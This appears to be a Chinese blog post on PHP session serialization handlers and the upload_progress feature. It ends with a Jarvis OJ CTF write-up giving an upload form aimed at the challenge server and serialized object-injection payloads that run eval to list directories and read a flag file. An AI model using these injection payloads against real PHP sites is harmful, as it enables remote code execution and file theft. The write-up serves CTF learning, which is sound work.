## session的存贮以及序列化以及漏洞
### 储存session
每个session标签对应着一个`$_SESSION`键-值类型数组，数组中的东西需要存储下来，首先需要序列化。
在php中session有三种序列化的方式，分别是php_serialize,php和php_binary
serializer | 实现方法
:--- | :---
php | 键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值
php_binary | 键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值
php_serialize | 把整个`$_SESSION`数组作为一个数组序列化

然后session序列化后需要储存在服务器上，默认的方式是储存在文件中，储存路径在`session.save_path`中，如果没有规定储存路径，那么默认会在储存在`/tmp`中，文件的名称是'sess_'+session名，文件中储存的是序列化后的session。
### php序列化机制
* String
`s:size:value;`
* Integer
`i:value;`
* Boolean
`b:value; (does not store "true" or "false", does store '1' or '0')`
* Null
`N;`
* Array
`a:size:{key definition;value definition;(repeated per element)}`
* Object
`O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}`

> 如果序列化一个对象，那么序列化的时候会调用`__sleep()`魔术方法，在反序列化时会调用`__wakeup()`魔术方法。

所以，如果我们有机会构造反序列化的东西，我们就有可能可以执行某些类的`__wakeup`和`__distruct()`方法。
> CVE-2016-7124
当对象标称成员个数多于实际成员个数时，会跳过`__wakeup()`方法，但是任然会执行`__destruct()`方法。
影响版本：PHP5 < 5.6.25   PHP7 < 7.0.10

如果在序列化字符串后面添加其他字符，该序列化字符串仍能反序列化成功。
### 设置session序列化方法中可能带来的隐患
我们现在先写一个对session写入的php脚本
```php
<?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
$name = $_GET['name'] ? $_GET['name'] : "name";
$value = $_GET['value'] ? $_GET['value'] : "value";
$_SESSION[$name] = $value;

if(isset($_GET['clean'])) session_destroy();
```
> 服务器中默认的session序列化器是php

我们对其传入一个`value=|s:5:"hack!";`，这时，session文件中储存的内容就会变成：
`a:1:{s:4:"name";s:13:"|s:5:"hack!";";}`
这在`php_serialize`中是一个数组，包含一个元素，但是如果另一个php页面没有设置相同的的序列化器，则会使用默认的序列化器php。如果用php序列化器解释session文件中的内容，|前的部分被解析为键，|后的部分被解析为值。对|后的部分进行分序列化，`s:5:"hack!";`会被解析字符串"hack!"，之后的`";}`会被直接忽略掉。
所以在另一个页面中我们session的内容就是`Array ( [a:1:{s:4:"name";s:13:"] => hack! ) `，这就提供给了我们利用反序列化漏洞的机会。

## php的upload_progress功能简述
[upload_progress](http://php.net/manual/zh/session.upload-progress.php)的目的是检测一个文件的上传进度，当然这个进度对上传没有什么用，但是可以允许客户端通过API获取当前的上传进度。在`session.upload_process.enabled`开启时会启用这个功能，在php.ini中会默认启用这个功能。
使用方法大体是这样，在POST一个文件之前，先传一个name为`session.upload_progress.name`（默认为`PHP_SESSION_UPLOAD_PROGRESS`）,value为用户自定义的一个upload_id。在文件上传的过程中，php会在session中生成一个上传信息，它在session中的键是`session.upload_progress.prefix`加上用户自定义的upload_id。在上传结束后这个session中的键值对会直接消失。下面是一个官方给的例子：
```php
<form action="upload.php" method="POST" enctype="multipart/form-data">
 <input type="hidden" name="<?php echo ini_get("session.upload_progress.name"); ?>" value="123" />
 <input type="file" name="file1" />
 <input type="file" name="file2" />
 <input type="submit" />
</form>
```
session中储存的值为：
```php
<?php
$_SESSION["upload_progress_123"] = array(
 "start_time" => 1234567890,   // The request time
 "content_length" => 57343257, // POST content length
 "bytes_processed" => 453489,  // Amount of bytes received and processed
 "done" => false,              // true when the POST handler has finished, successfully or not
 "files" => array(
  0 => array(
   "field_name" => "file1",       // Name of the <input/> field
   // The following 3 elements equals those in $_FILES
   "name" => "foo.avi",
   "tmp_name" => "/tmp/phpxxxxxx",
   "error" => 0,
   "done" => true,                // True when the POST handler has finished handling this file
   "start_time" => 1234567890,    // When this file has started to be processed
   "bytes_processed" => 57343250, // Amount of bytes received and processed for this file
  ),
  // An other file, not finished uploading, in the same request
  1 => array(
   "field_name" => "file2",
   "name" => "bar.avi",
   "tmp_name" => NULL,
   "error" => 0,
   "done" => false,
   "start_time" => 1234567899,
   "bytes_processed" => 54554,
  ),
 )
);
```
这个功能非常具有实用性，[但是在使用条件方面是相当苛刻的](https://stackoverflow.com/questions/12071358/how-to-make-php-upload-progress-session-work)。首先如果你是通过fastcgi使用PHP则完全不能使用这个功能，标志使用upload_progress的字段必须在文件之前，自定义session name可能会出现问题，因为这个处理是在php脚本运行之前处理的，存入的是默认的php session。还有最重要的一点，POST数据必须是实时发送给PHP的，否则PHP根本不可能监控文件上传，但是有很多web服务器都自带缓存功能，在整个文件POST完成的时候把数据发送给PHP，比如nginx啦，在服务端装了个nginx的反向代理肯定是不行的；在评论区有人说Apache2也需要关掉mod_mpm_prefork.so，但是我a2dismod mpm_prefork之后Apache直接报错挂了（砸），所以至今没有成功的使用这个功能。
>Secondly - in apache, don't use mod_mpm_prefork.so
That was the problem I had, that's the default in CentOS 7.
The problem is it causes Apache to wait with any additional requests until the upload is finished.

但是我们关注一下这个设置参数`session.upload_progress.cleanup`，这个选项的意思是上传完成时从session中清除上传进度信息，默认为开启，如果将其关闭的化，这个上传进度信息会一直留在session中，把这个选项关掉后我终于复现成功了，在session中读取了以下信息：
```
Array
(
    [upload_progress_ryat] => Array
        (
            [start_time] => 1535375683
            [content_length] => 326
            [bytes_processed] => 326
            [done] => 1
            [files] => Array
                (
                    [0] => Array
                        (
                            [field_name] => file
                            [name] => BrunuhVille - Timeless.torrent
                            [tmp_name] => /tmp/phpI3trrB
                            [error] => 3
                            [done] => 1
                            [start_time] => 1535375683
                            [bytes_processed] => 326
                        )

                )

        )

)
```
所以最终通过upload_progress，我们可以有限的更改session。
### Jarvis OJ PHPINFO writeup
拿到源码我们发现，存在一个对象，销毁的时候会eval一个成员变量，并且注释提示我们a webshell is waiting for you。我们猜到是要用eval弹一个webshell，同时我们可以查看phpinfo，在phpinfo中我们找到了一下关键的信息：
`session.serialize_handler`的master_value(在php.ini)中设置的值是php_serialize，然后在脚本启动时把这个值设置为php，这给我们提供了利用序列化器的不同进行实体注入的机会。
但是我们要找到一个写入session的机会，我们注意到`session.upload_progress.enabled`是开启的，同时`session.upload_progress.cleanup`是关闭的，所以upload_progress创建的session信息会已知一直在session中。
所以我们先创建一个辅助网页进行POST
```html
<form action="http://web.jarvisoj.com:32784/" method="POST" enctype="multipart/form-data">
<input name="PHP_SESSION_UPLOAD_PROGRESS" type="text">
<input type="file" name="file">
<input type="submit">
</form>
```
在upload_process中我们有两个途径改变session的值，一个是`PHP_SESSION_UPLOAD_PROGRESS`的值，它session键的一部分，另一个是文件名，在这里我们选择前者，因为比较方便。
因为目标服务器中session系列化器的全局设置是php_serialize， 所以upload_progress会用php_serialize的方式创建session文件，在执行index.php时，index.php先把序列化器设为php，然后session_start()，读取session文件。之前说过php序列化器，|前为键，|后为值，并且反序列化值的时候，会无视后面的东西，所以我们只需要在session中构造`|序列化后的字符串`就能成功进行php实体注入。
于是我们可以构造如下payload：

- `|O:5:"OowoO":1:{s:4:"mdzz";s:18:"print_r(__FILE__);";}`
	获取网页根目录`/opt/lampp/htdocs`
- `|O:5:"OowoO":1:{s:4:"mdzz";s:39:"print_r(scandir('/opt/lampp/htdocs/'));";}`
	获取储存flag的文件`Here_1s_7he_fl4g_buT_You_Cannot_see.php`
- `|O:5:"OowoO":1:{s:4:"mdzz";s:84:"echo file_get_contents('/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php');";}`
	读出flag